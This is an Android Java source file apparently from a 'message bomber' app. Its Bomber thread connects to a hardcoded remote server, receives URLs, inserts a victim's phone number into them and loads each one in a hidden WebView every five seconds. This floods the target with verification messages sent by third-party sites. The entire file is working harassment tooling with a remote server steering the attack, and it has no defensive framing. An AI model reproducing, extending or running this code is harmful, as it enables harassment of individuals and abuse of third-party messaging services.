package com.example.service;

import java.io.BufferedInputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.OptionalDataException;
import java.io.StreamCorruptedException;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.json.JSONArray;

import com.example.messagebomber.MainActivity;
import com.example.messagebomber.R.string;
import com.umeng.analytics.MobclickAgent;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.os.Looper;
import android.text.StaticLayout;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

public class Bomber extends Thread {

	int i = 0;
	int j = 0;
	String phoneNumber;
	WebView webView;
	String string;
	int flag = 0;
	int flag2 = 0;
	DataInputStream dis = null;
	boolean finish = true;
	String contentString;
	String a[];
	Context context;
	
	public Bomber(String phoneNumber, WebView webView, Context context) {
		this.phoneNumber = phoneNumber;
		this.webView = webView;
		this.context = context;
	}

	public void run() {
		Socket socket = null;
		try {
			socket = new Socket("121.199.31.211", 9999);
	
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		while (true) {
			try {
				dis = new DataInputStream(socket.getInputStream());
				contentString = dis.readUTF();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}			
			
			if(contentString.equals("finish")){
				Looper.prepare();
				Toast.makeText(context, "发送完毕", Toast.LENGTH_SHORT).show();
			    Looper.loop();
			}
			String finalString = replaceString(contentString, "13538805451", phoneNumber);
	//		System.out.println(finalString);
			a = finalString.split("\\*");
			bomb(webView, a[0]);
			try {
				sleep(5000);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}

	public void bomb(WebView webView, String url) {
		webView.setWebViewClient(new WebViewClient() {
			public void onPageFinished(WebView webView, String url) {
				super.onPageFinished(webView, url);
				webView.loadUrl(a[a.length-1]);
				System.out.println("这是url:"+a[0]);
			//	System.out.println("url:"+a[a.length-1]);
			}
		});

		webView.loadUrl(url);
		String testreg = "[^a-zA-Z\\s]";
	    Pattern matchsip = Pattern.compile(testreg);
	    Matcher mp = matchsip.matcher(url);
	    url = mp.replaceAll("");
	    MobclickAgent.onEvent(context, url);
	    System.out.println("这是URL使用了的标签："+url);
	}

	public static String replaceString(String src, String before, String after) {
		StringBuffer sb = new StringBuffer();
		int oldidx = 0;
		int idx = src.indexOf(before);
		while (idx != -1) {
			sb.append(src.substring(oldidx, idx)).append(after);
			oldidx = idx + before.length();
			idx = src.indexOf(before, oldidx);
		}
		if (oldidx < src.length())
			sb.append(src.substring(oldidx));
		return sb.toString();
	}

}
